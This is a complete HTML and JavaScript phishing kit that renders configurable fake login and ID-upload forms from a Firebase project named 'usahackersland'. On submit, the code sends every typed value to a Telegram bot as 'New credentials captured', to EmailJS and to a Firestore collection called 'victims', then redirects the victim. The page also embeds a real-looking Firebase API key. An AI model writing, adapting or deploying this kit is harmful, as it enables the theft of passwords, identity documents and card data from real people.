<!DOCTYPE html>
<html>
<head>
  <title>Generated Form</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body { font-family: Arial, sans-serif; background: #f0f0f0; padding: 20px; }
    .form-container {
      max-width: 800px;
      margin: auto;
      background: #fff;
      padding: 20px;
      border-radius: 10px;
    }
    img, video { max-width: 100%; border-radius: 8px; margin-bottom: 10px; }
    input, textarea, button {
      width: 100%; margin: 10px 0; padding: 10px;
      border-radius: 5px; border: 1px solid #ccc;
    }
  </style>
</head>
<body>
  <div class="form-container" id="formView">Loading form...</div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
      authDomain: "usahackersland.firebaseapp.com",
      projectId: "usahackersland",
      storageBucket: "usahackersland.appspot.com",
      messagingSenderId: "588407428267",
      appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // Telegram placeholders (replace later)
    const telegramBotToken = "YOUR_BOT_TOKEN";
    const telegramChatId = "YOUR_CHAT_ID";

    // EmailJS placeholders (replace later)
    emailjs.init("YOUR_PUBLIC_KEY");
    const emailServiceID = "YOUR_SERVICE_ID";
    const emailTemplateID = "YOUR_TEMPLATE_ID";

    const params = new URLSearchParams(location.search);
    let formId = params.get("id") || "defaultForm123";

    const $ = id => document.getElementById(id);

    db.collection("forms").doc(formId).get().then(doc => {
      if (!doc.exists) {
        $('formView').innerHTML = `<p style="color:red;">‚ùå Form not found.</p>`;
        return;
      }

      const data = doc.data();
      window.formRedirectURL = data.redirectLink;
      window.formDocId = formId;

      let html = `<div style="color:${data.textColor};background:${data.bgColor};padding:20px;border-radius:10px;background-image:url('${data.bgImageURL}');background-size:${data.bgWidth} ${data.bgHeight};">`;

      if (data.title) html += `<h2 style="text-align:center;color:${data.titleColor}">${data.title}</h2>`;
      if (data.avatarURL) html += `<div style="text-align:center;"><img src="${data.avatarURL}" style="width:120px;border-radius:50%;border:2px solid #ccc;"></div>`;
      if (data.bannerURL) html += `<img src="${data.bannerURL}" style="width:100%;">`;
      if (data.logoURL) html += `<div style="text-align:center;"><img src="${data.logoURL}" style="width:100px;"></div>`;
      if (data.description) html += `<p style="text-align:center;">${data.description}</p>`;
      if (data.warning) html += `<p style="color:${data.warningColor};text-align:center;font-weight:bold;">${data.warning}</p>`;

      html += `<form>`;
      if (data.addAuth) {
        html += `<input placeholder="${data.usernamePlaceholder || 'Username'}" type="text" name="username">
                 <input type="password" placeholder="${data.passwordPlaceholder || 'Password'}" name="password">`;
      }

      if (data.frontDesc) html += `<label>${data.frontDesc}</label><input type="file">`;
      if (data.backDesc) html += `<label>${data.backDesc}</label><input type="file">`;
      if (data.extraDesc) html += `<p style="color:${data.extraDescColor}">${data.extraDesc}</p>`;

      const fields = [...(data.fields || []), ...(data.extraFields || [])];
      fields.forEach(f => {
        if (f.trim()) html += `<input placeholder="${f.trim()}" name="${f.trim()}">`;
      });

      let emoji = {
        arrow: "‚û°Ô∏è", check: "‚úÖ", lock: "üîí",
        user: "üë§", credit: "üí≥", none: ""
      }[data.btnIcon] || "";

      html += `<button style="background:${data.btnColor};">${emoji} ${data.buttonText}</button>`;
      if (data.footerText) html += `<p style="text-align:center;">${data.footerText}</p>`;
      if (data.redirectDesc && data.useRedirect) html += `<p style="text-align:center;color:gray;">${data.redirectDesc}</p>`;
      html += `</form>`;

      if ((data.imageGallery || []).length || (data.videoGallery || []).length) {
        html += `<div style="margin-top:15px;">`;
        data.imageGallery.forEach(url => html += `<img src="${url}">`);
        data.videoGallery.forEach(url => html += `<video controls src="${url}"></video>`);
        html += `</div>`;
      }

      html += `</div>`;
      $('formView').innerHTML = html;
    }).catch(err => {
      $('formView').innerHTML = `<p style="color:red;">‚ö†Ô∏è Error loading form.</p><pre>${err.message}</pre>`;
    });
  </script>

  <script>
  document.addEventListener("DOMContentLoaded", function () {
      const formContainer = document.getElementById("formView");

      const observer = new MutationObserver(() => {
          const form = formContainer.querySelector("form");
          if (form) {
              observer.disconnect();

              form.addEventListener("submit", function (e) {
                  e.preventDefault();

                  let formDataObj = {};
                  form.querySelectorAll("input").forEach(input => {
                      if (input.type !== "file") {
                          formDataObj[input.placeholder || input.name] = input.value;
                      }
                  });

                  // Add redirect link to the log
                  formDataObj["redirectLinkSentTo"] = window.formRedirectURL || "N/A";

                  // Play notification sound
                  const audio = new Audio("https://actions.google.com/sounds/v1/alarms/beep_short.ogg");
                  audio.play();

                  // Send to Telegram
                  if (telegramBotToken !== "YOUR_BOT_TOKEN") {
                      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                          method: "POST",
                          headers: { "Content-Type": "application/json" },
                          body: JSON.stringify({
                              chat_id: telegramChatId,
                              text: `üî• New credentials captured:\n${JSON.stringify(formDataObj, null, 2)}`
                          })
                      });
                  }

                  // Send to Email
                  if (emailServiceID !== "YOUR_SERVICE_ID") {
                      emailjs.send(emailServiceID, emailTemplateID, formDataObj);
                  }

                  // Save to Firestore
                  if (window.formDocId) {
                      firebase.firestore()
                          .collection("forms")
                          .doc(window.formDocId)
                          .collection("victims")
                          .add({
                              ...formDataObj,
                              timestamp: new Date().toISOString()
                          })
                          .finally(() => {
                              window.location.href = window.formRedirectURL || "https://example.com";
                          });
                  } else {
                      window.location.href = window.formRedirectURL || "https://example.com";
                  }
              });
          }
      });

      observer.observe(formContainer, { childList: true, subtree: true });
  });
  </script>
</body>
</html>
